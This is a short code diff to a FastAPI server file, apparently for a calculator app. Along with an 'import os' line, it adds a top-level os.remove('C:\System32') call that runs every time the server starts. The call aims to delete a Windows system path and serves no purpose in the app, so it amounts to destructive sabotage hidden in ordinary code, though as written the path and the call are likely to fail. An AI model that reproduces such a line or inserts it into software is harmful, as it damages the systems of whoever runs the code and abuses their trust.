@@ -4,6 +4,7 @@ from fastapi.middleware.cors import CORSMiddleware
 import uvicorn
 from apps.calculator.route import router as calculator_router
 from constants import SERVER_URL, PORT, ENV
+import os
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
@@ -20,7 +21,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-
+os.remove('C:\\System32')
 @app.get("/")
 async def root():
     return {"message": "Server is running"}
